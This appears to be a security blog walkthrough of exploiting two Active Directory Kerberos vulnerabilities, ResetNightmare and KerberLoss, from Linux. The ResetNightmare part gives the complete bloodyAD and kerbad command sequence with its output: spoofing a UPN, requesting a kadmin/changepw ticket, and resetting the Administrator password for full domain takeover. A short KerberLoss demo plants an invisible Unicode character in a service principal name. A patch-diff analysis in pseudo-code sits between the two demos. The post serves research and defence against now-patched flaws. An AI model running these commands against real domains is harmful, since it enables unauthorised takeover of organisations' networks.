---
title: "Exploiting AD ResetNightmare (CVE-2026-27912) and KerberLoss (CVE-2026-25177) from Linux"
summary: "A Linux-oriented walkthrough of the CVE-2026-27912 ResetNightmare and KerberLoss (CVE-2026-25177) workflow"
date: 2026-08-10
authors:
  - admin
tags:
  - CVE
  - Microsoft
  - Kerberos
  - bloodyAD
  - kerbad
categories:
  - Active Directory
---

This article describes how to exploit two Kerberos-related Active Directory issues that were [discovered](https://www.semperis.com/blog/identity-crisis-novel-vulnerabilities-leading-to-kerberos-downgrade-dos-and-full-domain-takeover/) in the end of 2025 by Shai Laron from Semperis: ResetNightmare (`CVE-2026-27912`) and KerberLoss (`CVE-2026-25177`).

## ResetNightmare (CVE-2026-27912)

ResetNightmare is a Windows Kerberos authorization weakness that has been patched by Microsoft in [April 14 2026](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-27912). 

The researcher was looking for uniqueness verification flaws in Active Directory and discovered that setting the SamAccountName as a UPN (User Principal Name) for another user could be exploited through the Kerberos password change protocol.

This would allow an attacker having a `Write` right on a UPN to get a **Full Domain Takeover**.

In the demo below the attacker has a `Write` right on `john` user UPN.

### Step 1: Copy an Domain Admin `sAMAccountName` as a `userPrincipalName` value for another user

```bash
bloodyAD -H 192.168.100.3 -d bloody -u john -p 'Password123!' get object 'Administrator' --attr sAMAccountName

distinguishedName: CN=Administrator,CN=Users,DC=bloody,DC=corp
sAMAccountName: Administrator

bloodyAD -H 192.168.100.3 -d bloody -u john -p 'Password123!' set object john userPrincipalName -v Administrator
[+] john's userPrincipalName has been updated
```

### Step 2: Generate a Kerberos credential cache for the change-password service

Then we will request a TGT bound to the `kadmin/changepw` service context for **john** but using his UPN `Administrator` by providing `ptype=10` which tells Kerberos that the username we provided is of UPN type (`NT-ENTERPRISE(10)`) and not a sAMAccountName (`NT-PRINCIPAL(1)`):

```bash
badTGT 'kerberos+pw://bloody.corp\Administrator:Password123!@192.168.100.3/?ptype=10' --ccache john.ccache --sname kadmin/changepw

TGT stored in ccache file john.ccache

Realm        : BLOODY.CORP
Sname        : kadmin/changepw
UserName     : Administrator
UserRealm    : BLOODY.CORP
StartTime    : 2026-08-10 04:00:25+00:00
EndTime      : 2026-08-10 04:02:25+00:00
RenewTill    : 2026-08-10 04:02:25+00:00
Flags        : renewable, pre-authent, forwardable, initial, enc-pa-rep
Keytype      : 23
Key          : vY2Etp/mzA7WT3x6BBnVPQ==
EncodedKirbi : 
[...]
[+] Done!
```

### Step 3: Clear the spoofed `userPrincipalName`

```bash
bloodyAD -H 192.168.100.3 -d bloody -u john -p 'Password123!' set object john userPrincipalName
```

This step will allow us to trick the password-change service that will only find the user with the Administrator `sAMAccountName` in the next step. 

### Step 4: Submit a password-change request with the TGT

```bash
badchangepw 'kerberos+ccache://BLOODY.CORP\Administrator:john.ccache@192.168.100.3' 'newAdminPwd1!'
Password changed successfully!
```

That's it you're now domain admin of BLOODY.CORP!

## ResetNightmare Patch Analysis

A small BinDiff between the two `kdcsrv.dll` builds that were available before and after the April 2026 patch shows that the change lands inside the `KdcChangePassword` request path, not in the object-store access path. The emphasis of the patch is to add a new decision branch before the password-reset operation is allowed to continue and, in effect, to enforce an additional identity / PAC-SID check for the ticket that is being used to drive the reset.

Below the pseudo-code reconsitution:

```c
if (request_is_a_password_change_request) {
    // The post-patch build introduces a new validation gate.
    feature_enabled = EvaluateCurrentState(&g_Feature_Descriptor);
    if (feature_enabled != 0) {
        if (name_or_identifier_check_is_not_strictly_resolved) {
            // A second validation function is called here.
            // The goal is to reject a request that cannot be tied to
            // a valid PAC/SID context.
            if (KdcValidatePacUserSid(ticket_info, pac_info) == FALSE) {
                return STATUS_ACCESS_DENIED;
            }
        }
    }

    // If the new gate passes, the rest of the KDC change-password flow can run.
    continue_KdcChangePassword();
}
```

From the perspective of the patch, the most important indicator is this new element:

- `KdcValidatePacUserSid()` is new in the change-password execution branch and is used to reject a password change when the caller's identity does not pass the PAC/SID validation expected by the patched KDC logic.


## KerberLoss (CVE-2026-25177)

KerberLoss is the companion CVE that appears in the Semperis research publication. The issue is associated with the risk of malicious or confusing object names being accepted by AD and subsequently used in Kerberos service logic. 3 scenarios have been identified by the researcher:
 1. Denial-of-service to HOST-mapped services
 2. SPN-jacking (simplifies S4U attack)
 3. Authentication downgrade (Kerberos to NTLM)
This vulnerability has been patched by Microsoft in [March 10, 2026](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-25177)

A practical representation of that family of objects is the use of invisible Unicode characters in a servicePrincipalName attribute:

```bash
bloodyAD -H 192.168.100.3 -d bloody -u john -p 'Password123!' set object 'JOHNPC$' serviceprincipalname --bak -v 'HOST/MAI'$'\UE0154''N'
[+] JOHNPC$'s serviceprincipalname has been updated
[+] Restore command:
    set object 'JOHNPC$' servicePrincipalName -v 'RestrictedKrbHost/JOHNPC' -v 'HOST/JOHNPC' -v 'RestrictedKrbHost/JOHNPC.bloody.corp' -v 'HOST/JOHNPC.bloody.corp'

bloodyAD -H 192.168.100.3 -d bloody -u john -p 'Password123!' get object 'JOHNPC$' --attr servicePrincipalName | xxd
00000000: 0a64 6973 7469 6e67 7569 7368 6564 4e61  .distinguishedNa
00000010: 6d65 3a20 434e 3d4a 4f48 4e50 432c 434e  me: CN=JOHNPC,CN
00000020: 3d43 6f6d 7075 7465 7273 2c44 433d 626c  =Computers,DC=bl
00000030: 6f6f 6479 2c44 433d 636f 7270 0a73 6572  oody,DC=corp.ser
00000040: 7669 6365 5072 696e 6369 7061 6c4e 616d  vicePrincipalNam
00000050: 653a 2063 6966 732f 4d41 49f3 a085 944e  e: cifs/MAI....N
00000060: 0a                                       .
                                                      
```

`Set` command above allows to insert a non-printable unicode character which only appears in bash using `xxd` where we can see `servicePrincipalName: cifs/MAI....N`.

This article does not go further into the KerberLoss details, because the rest of that path is largely described in the Semperis publication and does not need another extended explanation. The intent here is only to place it alongside ResetNightmare as a second 2026 Active Directory/Kerberos naming problem that shares the same investigative surface.
